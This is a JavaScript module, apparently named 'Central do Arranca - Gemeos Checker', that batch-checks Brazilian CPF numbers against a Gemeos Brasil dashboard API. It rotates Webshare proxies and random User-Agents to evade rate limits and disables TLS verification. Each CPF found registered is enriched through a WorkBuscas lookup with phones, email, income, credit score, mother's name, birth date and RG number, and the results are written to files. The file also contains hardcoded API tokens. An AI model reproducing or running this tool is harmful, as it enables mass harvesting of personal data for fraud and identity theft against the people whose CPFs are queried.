/**
 * Central do Arranca - Gemeos Checker
 * Checker específico para a API Gemeos Brasil
 * Faz requisições para verificar CPFs na API Gemeos usando proxies da Webshare
 * Implementa fallback inteligente: proxy → sem proxy
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs-extra');
const path = require('path');
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent');
} catch (_) {
  HttpsProxyAgent = null;
}

class GemeosChecker {
  constructor(options = {}) {
    this.proxyApiToken = 'qxew5x0zbdftbcsh63ql5flysll0jaf5u96msek9';
    this.proxyApiUrl = 'https://proxy.webshare.io/api/v2/proxy/list/';
    this.proxies = [];
    this.results = [];
    this.successCount = 0;
    this.errorCount = 0;
    this.registeredCount = 0;
    this.unregisteredCount = 0;
    this.batchSize = 20;
    this.delay = 2000;
    this.timeout = 10000;
    this.useForeignOnly = !!options.useForeignOnly;
    
    // API WorkBuscas para consultas complementares
    this.workbuscasToken = 'kjvHiQNRxutJKrlFApVWhTcj';
    this.workbuscasUrl = 'https://completa.workbuscas.com/api';
    
    // Cache de proxies - módulo Gemeos
    this.cacheDir = path.join(__dirname, '../../.cache');
    this.cacheFile = path.join(this.cacheDir, 'proxies-gemeos.json');
    this.cacheExpiry = 24 * 60 * 60 * 1000; // 24 horas
  }

  /**
   * Cria configurações SSL padrão para requisições
   */
  getSSLConfig() {
    return {
      httpsAgent: new https.Agent({
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_2_method'
      }),
      proxy: false,
      maxRedirects: 5,
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    };
  }

  /**
   * Gera um User-Agent aleatório de navegador real
   */
  getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  /**
   * Verifica se o cache de proxies é válido
   */
  isCacheValid() {
    try {
      if (!fs.existsSync(this.cacheFile)) {
        return false;
      }
      
      const stats = fs.statSync(this.cacheFile);
      const now = Date.now();
      const cacheAge = now - stats.mtime.getTime();
      
      return cacheAge < this.cacheExpiry;
    } catch (error) {
      return false;
    }
  }

  /**
   * Carrega proxies do cache
   */
  loadFromCache() {
    try {
      const cacheData = fs.readJsonSync(this.cacheFile);
      this.proxies = cacheData.proxies || [];
      console.log(`📦 ${this.proxies.length} proxies carregados do cache`);
      return this.proxies;
    } catch (error) {
      console.log('❌ Erro ao carregar cache:', error.message);
      return [];
    }
  }

  /**
   * Salva proxies no cache
   */
  async saveToCache(proxies) {
    try {
      await fs.ensureDir(this.cacheDir);
      const cacheData = {
        proxies: proxies,
        timestamp: Date.now(),
        count: proxies.length
      };
      await fs.writeJson(this.cacheFile, cacheData, { spaces: 2 });
      console.log(`💾 ${proxies.length} proxies salvos no cache`);
    } catch (error) {
      console.log('❌ Erro ao salvar cache:', error.message);
    }
  }

  /**
   * Filtra apenas proxies brasileiros
   */
  filterBrazilianProxies(proxies) {
    const brazilianProxies = proxies.filter(proxy => {
      return proxy.country_code === 'BR' || 
             proxy.country_code === 'br' || 
             proxy.country_code === 'Brazil' ||
             proxy.country_code === 'brazil' ||
             proxy.country_code === 'BRASIL' ||
             proxy.country_code === 'brasil';
    });
    
    console.log(`🇧🇷 Filtrados ${brazilianProxies.length}/${proxies.length} proxies brasileiros`);
    return brazilianProxies;
  }

  /**
   * Filtra proxies estrangeiros (não BR)
   */
  filterForeignProxies(proxies) {
    const isBR = (cc) => {
      if (!cc) return false;
      const v = String(cc).toLowerCase();
      return v === 'br' || v === 'brazil' || v === 'brasil';
    };
    const foreign = proxies.filter(p => !isBR(p.country_code));
    console.log(`🌍 Filtrados ${foreign.length}/${proxies.length} proxies estrangeiros`);
    return foreign;
  }

  /**
   * Testa um proxy específico
   */
  async testProxy(proxy) {
    try {
      // Testa no endpoint alvo com CPF inválido para validar JSON esperado
      const testConfig = {
        method: 'get',
        url: `https://dashboard.gemeosbrasil.me/api/ver-numeros?telefone=null&cpf=${encodeURIComponent('000.000.000-00')}&lojista=null`,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'accept': 'application/json, text/plain, */*',
          'accept-encoding': 'gzip, deflate, br, zstd',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'origin': 'https://www.gemeosbrasil.me',
          'referer': 'https://www.gemeosbrasil.me/'
        },
        timeout: 7000,
        ...this.getSSLConfig(),
        validateStatus: function (status) { return status >= 200 && status < 500; }
      };
      
      if (HttpsProxyAgent) {
        const authPart = proxy.username && proxy.password
          ? `${encodeURIComponent(proxy.username)}:${encodeURIComponent(proxy.password)}@`
          : '';
        const proxyUrl = `http://${authPart}${proxy.proxy_address}:${proxy.port}`;
        testConfig.proxy = false;
        testConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
      } else {
        testConfig.proxy = {
          host: proxy.proxy_address,
          port: proxy.port,
          auth: proxy.username && proxy.password ? {
            username: proxy.username,
            password: proxy.password
          } : undefined,
          protocol: 'http'
        };
      }
      
      const response = await axios(testConfig);
      const data = response.data;
      const isObj = typeof data === 'object' && data !== null;
      const hasComprasKey = isObj && (data.compras !== undefined || data.next !== undefined || data.result !== undefined);
      return isObj && hasComprasKey;
    } catch (error) {
      return false;
    }
  }

  /**
   * Testa múltiplos proxies em paralelo
   */
  async testProxies(proxies, progressCallback) {
    console.log(`🧪 Testando ${proxies.length} proxies...`);
    
    const batchSize = 10;
    const validProxies = [];
    
    for (let i = 0; i < proxies.length; i += batchSize) {
      const batch = proxies.slice(i, i + batchSize);
      
      const promises = batch.map(async (proxy) => {
        const isValid = await this.testProxy(proxy);
        return isValid ? proxy : null;
      });
      
      const batchResults = await Promise.all(promises);
      const validBatch = batchResults.filter(proxy => proxy !== null);
      validProxies.push(...validBatch);
      
      if (progressCallback) {
        progressCallback(validProxies.length);
      }
      
      // Pequena pausa entre lotes
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    console.log(`✅ ${validProxies.length}/${proxies.length} proxies válidos encontrados`);
    return validProxies;
  }

  /**
   * Carrega proxies da API Webshare
   */
  async loadProxies(progressCallback) {
    // Verifica cache primeiro
    if (this.isCacheValid()) {
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        return this.proxies;
      }
    }
    
    console.log('🔄 Carregando proxies da Webshare...');
    
    try {
      const allProxies = [];
      let page = 1;
      const pageSize = 25;
      
      while (true) {
        const response = await axios.get(this.proxyApiUrl, {
          params: {
            mode: 'direct',
            page: page,
            page_size: pageSize
          },
          headers: {
            'Authorization': `Token ${this.proxyApiToken}`
          },
          timeout: 10000,
          ...this.getSSLConfig()
        });
        
        const proxies = response.data.results || [];
        if (proxies.length === 0) break;
        
        allProxies.push(...proxies);
        
        if (progressCallback) {
          progressCallback(allProxies.length);
        }
        
        page++;
        
        if (allProxies.length >= 1000) break;
        // Breve atraso para permitir visualização de progresso na splash/GUI
        await new Promise(resolve => setTimeout(resolve, 200));
      }
      
      // Seleciona proxies conforme modo
      if (this.useForeignOnly) {
        console.log('🌍 Modo teste: usando apenas proxies estrangeiros (não BR)');
        this.proxies = this.filterForeignProxies(allProxies).slice(0, 1000);
      } else {
        console.log('🌍 Usando proxies globais da Webshare (sem filtro por país)');
        this.proxies = allProxies.slice(0, 1000);
      }
      
      // Testa proxies antes de salvar no cache
      const validProxies = await this.testProxies(this.proxies, progressCallback);
      
      if (validProxies.length === 0) {
        console.log('⚠️ Nenhum proxy válido encontrado, usando todos os proxies');
        this.proxies = this.proxies.slice(0, 1000);
      } else {
        this.proxies = validProxies.slice(0, 1000);
      }
      
      // Salva no cache
      await this.saveToCache(this.proxies);
      
      return this.proxies;
      
    } catch (error) {
      console.log('❌ Erro ao carregar proxies:', error.message);
      
      // Fallback para cache mesmo expirado
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        console.log('📦 Usando cache expirado como fallback');
        this.proxies = cachedProxies;
        return this.proxies;
      }
      
      throw error;
    }
  }

  /**
   * Obtém um proxy aleatório
   */
  getRandomProxy() {
    if (this.proxies.length === 0) {
      return null;
    }
    
    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
    return {
      host: proxy.proxy_address,
      port: proxy.port,
      auth: proxy.username && proxy.password ? {
        username: proxy.username,
        password: proxy.password
      } : undefined
    };
  }

  /**
   * Faz requisição para a API (com ou sem proxy)
   */
  async makeAPIRequest(cpf, proxy) {
    try {
      const axiosConfig = {
        method: 'get',
        url: `https://dashboard.gemeosbrasil.me/api/ver-numeros?telefone=null&cpf=${encodeURIComponent(cpf)}&lojista=null`,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'accept': 'application/json, text/plain, */*',
          'accept-encoding': 'gzip, deflate, br, zstd',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'origin': 'https://www.gemeosbrasil.me',
          'referer': 'https://www.gemeosbrasil.me/'
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      };
      
      if (proxy) {
        if (HttpsProxyAgent) {
          const authPart = proxy.auth && proxy.auth.username && proxy.auth.password
            ? `${encodeURIComponent(proxy.auth.username)}:${encodeURIComponent(proxy.auth.password)}@`
            : '';
          const proxyUrl = `http://${authPart}${proxy.host}:${proxy.port}`;
          axiosConfig.proxy = false; // usar agent em vez do objeto proxy
          axiosConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
        } else {
          axiosConfig.proxy = {
            host: proxy.host,
            port: proxy.port,
            auth: proxy.auth,
            protocol: 'http'
          };
        }
      }
      
      const response = await axios(axiosConfig);
      
      // Normaliza resposta: tenta parsear JSON mesmo se content-type vier errado
      const contentType = (response.headers && (response.headers['content-type'] || response.headers['Content-Type'])) || '';
      if (typeof response.data === 'string') {
        const trimmed = response.data.trim();
        if ((trimmed.startsWith('{') && trimmed.endsWith('}')) || (trimmed.startsWith('[') && trimmed.endsWith(']'))) {
          try {
            response.data = JSON.parse(trimmed);
          } catch (_) {
            // segue abaixo para marcar como desconhecida
          }
        }
      }
      const dataIsObject = typeof response.data === 'object' && response.data !== null;
      if (!dataIsObject) {
        // Trata resposta não-JSON como não cadastrado, sem poluir logs
        const result = {
          cpf: cpf,
          success: true,
          status: response.status,
          data: null,
          proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
          interpretation: 'not_registered',
          timestamp: new Date().toISOString()
        };
        this.unregisteredCount++;
        this.successCount++;
        return result;
      }

      const result = {
        cpf: cpf,
        success: true,
        status: response.status,
        data: response.data,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
      };

      // Tratamento de rate limit (mensagem em PT-BR)
      try {
        const payloadText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const isRateLimited = /excedeu o limite|limite de consultas|rate limit/i.test(payloadText) || response.status === 429;
        if (isRateLimited) {
          return {
            cpf: cpf,
            success: false,
            error: 'rate_limited',
            status: response.status,
            proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
          };
        }
      } catch (_) {}

      // Interpretação do retorno da nova rota (dashboard.gemeosbrasil.me)
      try {
        const payload = response.data;
        const compras = payload?.compras;
        const isRegistered = Array.isArray(compras) && compras.length > 0;
        
        if (isRegistered) {
          this.registeredCount++;
          result.interpretation = 'registered';
          result.products = { success: true, data: compras, count: compras.length };
          // Dados úteis do primeiro registro (telefone mascarado, hashes)
          const first = compras[0];
          if (first?.user) {
            result.user = {
              id: first.user.id,
              nome: first.user.nome,
              telefone: first.user.telefone,
              email_hash: first.user.hash?.email,
              phone_hash: first.user.hash?.phone,
              phone_plus_hash: first.user.hash?.phone_plus
            };
          }
        } else {
          this.unregisteredCount++;
          result.interpretation = 'not_registered';
        }
      } catch (_) {
        // Fallback conservador
        this.unregisteredCount++;
        result.interpretation = 'not_registered';
      }

      result.timestamp = new Date().toISOString();

      this.successCount++;
      return result;

    } catch (error) {
      if (error.response && error.response.status === 400) {
        try {
          const payload = error.response.data;
          const compras = payload?.compras;
          const isRegistered = Array.isArray(compras) && compras.length > 0;
          const result = {
            cpf: cpf,
            success: true,
            status: 400,
            data: payload,
            proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
          };
          if (isRegistered) {
            this.registeredCount++;
            result.interpretation = 'registered';
            result.products = { success: true, data: compras, count: compras.length };
          } else {
            this.unregisteredCount++;
            result.interpretation = 'not_registered';
          }
          result.timestamp = new Date().toISOString();
          this.successCount++;
          return result;
        } catch (_) {
          // continua para retorno de erro padrão
        }
      }
      this.errorCount++;
      return {
        cpf: cpf,
        success: false,
        error: error.message,
        status: error.response?.status || 0,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
      };
    }
  }

  /**
   * Consulta dados complementares na API WorkBuscas
   * Retorna: telefone, email, renda, score, nome da mãe e data de nascimento
   */
  async consultWorkBuscas(cpf) {
    try {
      const url = `${this.workbuscasUrl}?token=${this.workbuscasToken}&modulo=cpf&consulta=${cpf}`;
      
      const axiosConfig = {
        method: 'get',
        url: url,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'accept': 'application/json',
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      };

      const response = await axios(axiosConfig);
      
      if (response.status !== 200 || !response.data) {
        return null;
      }

      const data = response.data;
      
      // Extrai os dados solicitados
      const workbuscasData = {
        telefone: null,
        telefones: [], // Array com todos os telefones
        email: null,
        renda: null,
        score: null,
        nomeMae: null,
        dataNascimento: null,
        rg: null,
        rgDataEmissao: null,
        rgOrgaoEmissor: null,
        rgUfEmissao: null
      };

      // Telefones (pega todos os telefones disponíveis)
      if (data.telefones && Array.isArray(data.telefones) && data.telefones.length > 0) {
        workbuscasData.telefones = data.telefones.map(t => ({
          numero: t.telefone || null,
          operadora: t.operadora || null,
          tipo: t.tipo || null,
          status: t.status || null,
          whatsapp: t.whatsapp || null
        })).filter(t => t.numero !== null); // Remove telefones sem número
        
        // Mantém compatibilidade: primeiro telefone como telefone principal
        if (workbuscasData.telefones.length > 0) {
          workbuscasData.telefone = workbuscasData.telefones[0].numero;
        }
      }

      // Email (pega o primeiro disponível)
      if (data.emails && Array.isArray(data.emails) && data.emails.length > 0) {
        workbuscasData.email = data.emails[0].email || null;
      }

      // Renda e Score (DadosEconomicos)
      if (data.DadosEconomicos) {
        if (data.DadosEconomicos.renda) {
          workbuscasData.renda = data.DadosEconomicos.renda;
        }
        if (data.DadosEconomicos.score?.scoreCSB) {
          workbuscasData.score = data.DadosEconomicos.score.scoreCSB;
        }
      }

      // Nome da mãe e data de nascimento (DadosBasicos)
      if (data.DadosBasicos) {
        if (data.DadosBasicos.nomeMae) {
          workbuscasData.nomeMae = data.DadosBasicos.nomeMae;
        }
        if (data.DadosBasicos.dataNascimento) {
          workbuscasData.dataNascimento = data.DadosBasicos.dataNascimento;
        }
      }

      // RG (Registro Geral)
      if (data.registroGeral && typeof data.registroGeral === 'object' && data.registroGeral !== null) {
        if (data.registroGeral.rgNumero) {
          workbuscasData.rg = data.registroGeral.rgNumero;
        }
        if (data.registroGeral.dataEmissao) {
          workbuscasData.rgDataEmissao = data.registroGeral.dataEmissao;
        }
        if (data.registroGeral.orgaoEmissor) {
          workbuscasData.rgOrgaoEmissor = data.registroGeral.orgaoEmissor;
        }
        if (data.registroGeral.ufEmissao) {
          workbuscasData.rgUfEmissao = data.registroGeral.ufEmissao;
        }
      }

      // Verifica se pelo menos um dado foi extraído
      const hasData = Object.values(workbuscasData).some(v => v !== null);
      if (!hasData) {
        console.warn(`[WorkBuscas] Nenhum dado extraído para CPF ${cpf}`);
        return null;
      }
      
      return workbuscasData;
    } catch (error) {
      // Em caso de erro, retorna null silenciosamente (não é crítico)
      console.warn(`[WorkBuscas] Erro ao consultar CPF ${cpf}:`, error.message);
      return null;
    }
  }

  /**
   * Verifica um único CPF na API com fallback inteligente
   */
  async checkCPF(cpf, showProxyInfo = false) {
    const startTime = Date.now();
    
    try {
      let attempts = 0;
      let lastError = null;
      let usedProxy = null;
      let result = null;

      // Tenta com proxies (até 5)
      while (attempts < 5) {
        usedProxy = this.getRandomProxy();
        result = await this.makeAPIRequest(cpf, usedProxy);
        if (result.success) break;

        const err = String(result.error || '');
        const isTimeout = /timeout|ETIMEDOUT|ECONNABORTED|Network/i.test(err);
        const isUnknown = /unknown_response|non_json|html/i.test(err);
        const isRateLimited = /rate_limited/i.test(err) || result.status === 429;
        const isNetworkStatus = !result.status || result.status === 0;

        if (usedProxy && (isTimeout || isUnknown || isRateLimited || isNetworkStatus)) {
          this.proxies = this.proxies.filter(p => !(p.proxy_address === usedProxy.host && p.port === usedProxy.port));
        }

        lastError = err || `Status ${result.status}`;
        attempts++;
      }

      // Se ainda não obteve sucesso, tenta sem proxy (pode cair no mesmo rate limit)
      if (!result || !result.success) {
        result = await this.makeAPIRequest(cpf, null);
        // Se sem proxy cair em rate limit, devolve erro claro
        if (!result.success && (/rate_limited/i.test(String(result.error)) || result.status === 429)) {
          return {
            cpf: cpf,
            success: false,
            error: 'rate_limited',
            status: result.status || 429,
            proxy: 'Sem Proxy'
          };
        }
      }
      
      // Se encontrou CPF registrado, consulta API WorkBuscas para dados complementares
      if (result && result.success && result.interpretation === 'registered') {
        try {
          const workbuscasData = await this.consultWorkBuscas(cpf);
          if (workbuscasData) {
            result.workbuscas = workbuscasData;
          } else {
            console.warn(`[WorkBuscas] Nenhum dado retornado para CPF ${cpf}`);
          }
        } catch (error) {
          // Não falha a requisição se WorkBuscas falhar
          console.warn(`[WorkBuscas] Erro ao consultar CPF ${cpf}:`, error.message);
        }
      }
      
      const endTime = Date.now();
      result.duration = endTime - startTime;
      
      return result;
      
    } catch (error) {
      const endTime = Date.now();
      return {
        cpf: cpf,
        success: false,
        error: error.message,
        status: error.response?.status || 0,
        duration: endTime - startTime,
        proxy: 'Error'
      };
    }
  }

  /**
   * Verifica múltiplos CPFs em lotes com proxies rotativos
   */
  async checkMultipleCPFs(cpfs) {
    const results = [];
    
    if (this.proxies.length === 0) {
      await this.loadProxies();
    }
    
    for (let i = 0; i < cpfs.length; i += this.batchSize) {
      const batch = cpfs.slice(i, i + this.batchSize);
      const batchNumber = Math.floor(i / this.batchSize) + 1;
      const totalBatches = Math.ceil(cpfs.length / this.batchSize);
      
      
      const batchPromises = batch.map(async (cpf, index) => {
        try {
          await this.sleep(index * 100);
          
          const result = await this.checkCPF(cpf, true);
          if (!result.timestamp) {
            result.timestamp = new Date().toISOString();
          }
          this.results.push(result);
          
          const proxyInfo = '';
          const status = result.interpretation === 'registered' ? 'CADASTRADO' : 'NÃO CADASTRADO';
          const comprasCount = result.products && result.products.success ? result.products.count : 0;
          const foneMask = result.user && result.user.telefone ? ` - ${result.user.telefone}` : '';
          const extra = result.interpretation === 'registered' ? ` | compras=${comprasCount}${foneMask}` : '';
          if (status === 'CADASTRADO') {
            console.log(`✅ [Gemeos] CPF ${cpf} CADASTRADO${proxyInfo}`);
          }
          
          return result;
        } catch (error) {
          console.error(`❌ Erro ao verificar CPF ${cpf}:`, error.message);
          this.errorCount++;
          const failed = {
            cpf: cpf,
            success: false,
            error: error.message,
            timestamp: new Date().toISOString(),
            proxy: null
          };
          this.results.push(failed);
          return failed;
        }
      });
      
      const batchResults = await Promise.all(batchPromises);
      results.push(...batchResults);
      
      if (i + this.batchSize < cpfs.length) {
        await this.sleep(this.delay);
      }
    }
    
    return results;
  }

  /**
   * Salva resultados em arquivo
   */
  async saveResults(filename = null) {
    if (!filename) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      filename = path.join(__dirname, '../../lista/gemeos-valid-cpfs-' + timestamp + '.txt');
    }

    const validCPFs = this.results.filter(result => 
      result.success && result.interpretation === 'registered'
    );

    if (validCPFs.length === 0) {
      console.log('Nenhum CPF válido encontrado para salvar.');
      return;
    }

    let txtContent = '';
    txtContent += '🔍 CENTRAL DO ARRANCA - CPFs VÁLIDOS ENCONTRADOS\n';
    txtContent += '='.repeat(60) + '\n\n';
    txtContent += `📅 Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    txtContent += `📊 Total de CPFs válidos: ${validCPFs.length}\n`;
    txtContent += `📝 Nota: Apenas CPFs com cadastro na plataforma Gemeos Brasil\n\n`;
    txtContent += '='.repeat(60) + '\n\n';

    validCPFs.forEach((result, index) => {
      txtContent += `📋 CPF ${index + 1}:\n`;
      txtContent += `   🔢 CPF: ${result.cpf}\n`;
      txtContent += `   ✅ Status: CADASTRADO\n`;
      txtContent += `   🌐 Proxy usado: ${result.proxy || 'Sem Proxy'}\n`;
      txtContent += `   ⏰ Verificado em: ${new Date(result.timestamp).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n\n`;

      // Dados de usuário adaptados ao novo endpoint (telefone mascarado e hashes)
      if (result.user) {
        txtContent += `   👤 DADOS DO USUÁRIO:\n`;
        if (result.user.id !== undefined) txtContent += `      🆔 ID: ${result.user.id}\n`;
        if (result.user.nome) txtContent += `      📛 Nome: ${result.user.nome}\n`;
        if (result.user.telefone) txtContent += `      📱 Telefone (mascarado): ${result.user.telefone}\n`;
        if (result.user.email_hash) txtContent += `      🔒 Email (hash): ${result.user.email_hash}\n`;
        if (result.user.phone_hash) txtContent += `      🔒 Phone (hash): ${result.user.phone_hash}\n`;
        if (result.user.phone_plus_hash) txtContent += `      🔒 Phone+ (hash): ${result.user.phone_plus_hash}\n`;
        txtContent += '\n';
      }

      // Compras (novo endpoint)
      if (result.products && result.products.success) {
        txtContent += `   🧾 COMPRAS:\n`;
        txtContent += `      📊 Quantidade: ${result.products.count}\n`;
        if (Array.isArray(result.products.data) && result.products.data.length > 0) {
          const preview = result.products.data.slice(0, 3).map((c, i) => {
            const title = c?.rifa?.title || c?.rifa?.titulo || c?.titulo || 'Compra';
            const data = c?.data || c?.insert || '';
            return `${i + 1}) ${title}${data ? ` - ${data}` : ''}`;
          }).join('\n         ');
          txtContent += `      📋 Amostra:\n         ${preview}\n`;
          if (result.products.data.length > 3) {
            txtContent += `         ... (+${result.products.data.length - 3} mais)\n`;
          }
        }
        txtContent += '\n';
      }

      txtContent += '─'.repeat(40) + '\n\n';
    });

    try {
      // Garantir que a pasta lista existe
      const listaDir = path.join(__dirname, '../../lista');
      if (!fs.existsSync(listaDir)) {
        fs.mkdirSync(listaDir, { recursive: true });
      }
      
      // Garantir que filename é um caminho absoluto se necessário
      if (!path.isAbsolute(filename)) {
        filename = path.join(listaDir, path.basename(filename));
      }
      
      await fs.writeFile(filename, txtContent, 'utf8');
    } catch (error) {
      console.log('❌ [Gemeos] Erro ao salvar resultados:', error.message);
    }
  }

  /**
   * Exibe resumo das verificações
   */
  showSummary() {
    console.log('\n' + '='.repeat(50));
    console.log('📊 RESUMO DAS VERIFICAÇÕES');
    console.log('='.repeat(50));
    console.log(`✅ Sucessos: ${this.successCount}`);
    console.log(`❌ Erros: ${this.errorCount}`);
    console.log(`👤 CPFs cadastrados: ${this.registeredCount}`);
    console.log(`❌ CPFs não cadastrados: ${this.unregisteredCount}`);
    console.log(`🌐 Proxies disponíveis: ${this.proxies.length}`);
    console.log('='.repeat(50));
  }

  /**
   * Função de sleep
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = GemeosChecker;
